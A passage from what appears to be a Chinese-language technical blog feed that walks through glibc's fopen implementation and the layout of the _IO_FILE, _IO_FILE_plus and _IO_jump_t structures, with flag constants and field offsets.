Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._IO_file_flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>&#x2F;libio&#x2F;genops.c</strong> </p><p><strong>_IO_link_in</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (_IO_FILE *) fp;</span><br><span class="line">      _IO_flockfile ((_IO_FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">      ++_IO_list_all_stamp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((_IO_FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>_IO_LINKED标志位用来指示一个streambuf对象是否已经被添加到了_list_all链表中。</p><p>如果一个streambuf对象链接到了_IO_list_all链表，则_IO_LINKED标志位会被设置为1，否则为0</p></blockquote><p>fp-&gt;file._flags &amp; _IO_LINKED检测到为0则设置为1并把_chain设置为当前_IO_list_all，把_IO_list_all设置为当前_IO_FILE_plus</p><h3 id="IO-file-fopen执行系统调用打开文件"><a href="#IO-file-fopen执行系统调用打开文件" class="headerlink" title="_IO_file_fopen执行系统调用打开文件"></a><code>_IO_file_fopen</code>执行系统调用打开文件</h3><p>回到__fopen_internal，调用_IO_file_fopen</p><p><strong>libio&#x2F;fileops.c</strong></p><p><strong>_IO_file_fopen</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_file_fopen _IO_file_fopen</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_new_file_fopen (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">            <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  _IO_FILE *result;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    #define _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br><span class="line"><span class="comment">    先检测了文件是不是打开，打开直接返回</span></span><br><span class="line"><span class="comment">    在_IO_new_file_init** 设置了fp-&gt;file._fileno = -1;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    根据我们fopen的mode设置文件打开模式</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">      omode = O_RDWR;</span><br><span class="line">      read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      oflags |= O_EXCL;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      last_recognized = mode;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> O_CLOEXEC</span></span><br><span class="line">      oflags |= O_CLOEXEC;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      满足一下其他组合mode 如r+ rw+ a+ wb等</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">/* Ignore.  */</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">              is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      .....................</span><br><span class="line">          .....................</span><br><span class="line">          .....................</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用</p><p><strong>_IO_file_open</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE *</span><br><span class="line">_IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot,</span><br><span class="line">           <span class="type">int</span> read_write, <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">     </span><br><span class="line">    fdesc = open_not_cancel (filename,</span><br><span class="line">                 posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      </span><br><span class="line">    fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  <span class="comment">/* For append mode, send the file offset to the end of the file.  Don&#x27;t</span></span><br><span class="line"><span class="comment">     update the offset cache though, since the file handle is not active.  */</span></span><br><span class="line">  <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">    &#123;</span><br><span class="line">      close_not_cancel (fdesc);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">  <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用系统函数open打开文件</p><p><img src="/2023/03/30/IO-FILE-fopen/image-20230331133757733.png" alt="image-20230331133757733"></p><p>,把返回值给到_fileno字段，再次<code>_IO_link_in</code>函数加入<code>_IO_list_all</code>链表</p>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO_FILE</title>
      <link href="/2023/03/29/IO-FILE/"/>
      <url>/2023/03/29/IO-FILE/</url>
      
        <content type="html"><![CDATA[<p>最初学习c语言的时候，我们经常会用fopen打开一些文件来操作</p><p><code>FILE *fopen(const char *filename, const char *mode)</code></p><p>返回一个FILE文件指针，这个FILE到底是什么呢?他的底层数据结构什么样子?都有什么用呢?我们经常用的io函数又和这个有什么关系呢?</p><h2 id="What-is-FILE"><a href="#What-is-FILE" class="headerlink" title="What is FILE??"></a>What is FILE??</h2><p>看一下源码 <code>libio/libioP.h</code>中</p><p><code>typedef struct _IO_FILE FILE;</code></p><h3 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为宽字符准备的结构体 defined _GLIBCPP_USE_WCHAR_T</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;          <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;          <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;         <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;        <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;         <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;         <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;          <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;           <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;         <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;       <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                                   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;          <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span>  _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="type">wchar_t</span>             _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="flags字段"><a href="#flags字段" class="headerlink" title="_flags字段"></a>_flags字段</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Magic numbers and bits for the _flags field.</span></span><br><span class="line"><span class="comment">   The magic numbers use the high-order bits of _flags;</span></span><br><span class="line"><span class="comment">   the remaining bits are available for variable flags.</span></span><br><span class="line"><span class="comment">   Note: The magic numbers must all be negative if stdio</span></span><br><span class="line"><span class="comment">   emulation is desired. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _OLD_STDIO_MAGIC 0xFABC0000 <span class="comment">/* Emulate old stdio. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MAGIC_MASK 0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_BUF 1 <span class="comment">/* User owns buffer; don&#x27;t delete it on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNBUFFERED 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_READS 4 <span class="comment">/* Reading not allowed */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_NO_WRITES 8 <span class="comment">/* Writing not allowd */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_EOF_SEEN 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_ERR_SEEN 0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_DELETE_DONT_CLOSE 0x40 <span class="comment">/* Don&#x27;t call close(_fileno) on cleanup. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINKED 0x80 <span class="comment">/* Set if linked (using _chain) to streambuf::_list_all.*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IN_BACKUP 0x100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_LINE_BUF 0x200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_TIED_PUT_GET 0x400 <span class="comment">/* Set if put and get pointer logicly tied. */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_APPENDING 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_BAD_SEEN 0x4000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_USER_LOCK 0x8000</span></span><br></pre></td></tr></table></figure><p>_flag的<code>高两位</code>字节是由libc固定的Magic number</p><p><code>低两位</code>字节的位数规则决定了程序的执行状态</p><p>_mode 字段</p><ul><li><code>_IOFBF</code>（0）：文件流是全缓冲模式。</li><li><code>_IOLBF</code>（1）：文件流是行缓冲模式。</li><li><code>_IONBF</code>（2）：文件流是无缓冲模式。</li><li><code>_IOREADING</code>（3）：文件流当前正在进行读操作。</li><li><code>_IOWRITING</code>（4）：文件流当前正在进行写操作。</li><li><code>_IOAPPEND</code>（8）：文件流是以追加模式打开的。</li><li><code>_IOEOF</code>（16）：文件流已经到达了文件的末尾。</li><li><code>_IOERR</code>（32）：文件流出现了错误。</li><li><code>_IOSTRG</code>（64）：文件流是一个字符串流。</li><li><code>_IORW</code>（128）：文件流是读写模式。</li></ul><blockquote><p>为什么要有输入输出缓冲区？</p><p>主要原因是为了提高程序的性能。输入输出操作通常比内存操作慢得多，因为它们涉及到从硬盘、网络等设备读取或写入数据。使用缓冲区可以减少实际的IO操作次数，从而提高程序的效率。</p><p>考虑IO性能和CPU性能的差距，会缓存一段buffer，这段buffer满或者外部触发时就可以出发写入或者读出操作了。</p></blockquote><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。</p><p>FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。</p><p>在标准 I&#x2F;O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr在libc.so的数据段的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_2_1_stderr_</span><br><span class="line">_IO_2_1_stdout_</span><br><span class="line">_IO_2_1_stdin_</span><br></pre></td></tr></table></figure><p>进程里用_IO_FILE._chain构成一个单向链表,链表头部在libc全局变量<strong>_IO_list_all</strong>处</p><p>_IO_list_all_stamp是一个全局变量，它是用于记录所有打开的流（stream）的时间戳（timestamp）的。</p><p><code>extern struct _IO_FILE_plus *_IO_list_all;</code></p><p>初始时单链表是这样的</p><p><code>_IO_list_all--&gt;_IO_2_1_stderr_--&gt;_IO_2_1_stdout_--&gt;_IO_2_1_stdin_</code></p><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><p><img src="/2023/03/29/IO-FILE/image-20230329194516352.png" alt="image-20230329194516352"></p><p>可以用<code>p *(struct _IO_FILE_plus *) addr</code>来打印</p><p>可以看出实际应用中我们使用时是<code> _IO_FILE_plus</code>结构体</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;<span class="comment">//32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="偏移"><a href="#偏移" class="headerlink" title="偏移"></a>偏移</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x0   _flags</span><br><span class="line">0x8   _IO_read_ptr</span><br><span class="line">0x10  _IO_read_end</span><br><span class="line">0x18  _IO_read_base</span><br><span class="line">0x20  _IO_write_base</span><br><span class="line">0x28  _IO_write_ptr</span><br><span class="line">0x30  _IO_write_end</span><br><span class="line">0x38  _IO_buf_base</span><br><span class="line">0x40  _IO_buf_end</span><br><span class="line">0x48  _IO_save_base</span><br><span class="line">0x50  _IO_backup_base</span><br><span class="line">0x58  _IO_save_end</span><br><span class="line">0x60  _markers</span><br><span class="line">0x68  _chain</span><br><span class="line">0x70  _fileno</span><br><span class="line">0x74  _flags2</span><br><span class="line">0x78  _old_offset</span><br><span class="line">0x80  _cur_column</span><br><span class="line">0x82  _vtable_offset</span><br><span class="line">0x83  _shortbuf</span><br><span class="line">0x88  _lock</span><br><span class="line">0x90  _offset</span><br><span class="line">0x98  _codecvt</span><br><span class="line">0xa0  _wide_data</span><br><span class="line">0xa8  _freeres_list</span><br><span class="line">0xb0  _freeres_buf</span><br><span class="line">0xb8  __pad5</span><br><span class="line">0xc0  _mode    </span><br><span class="line">0xc4  _unused2</span><br><span class="line">0xd8  vtable</span><br></pre></td></tr></table></figure><p><code>IO_jump_t * vtable;</code>虚表，一下子联想到c++虚函数底层原理</p><p><code>_IO_jump_t</code>中保存了一些可以跳转的函数指针，标准 IO 函数需要文件流指针指引去调用虚表函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2023/03/29/IO-FILE/image-20230329195951585.png" alt="image-20230329195951585" 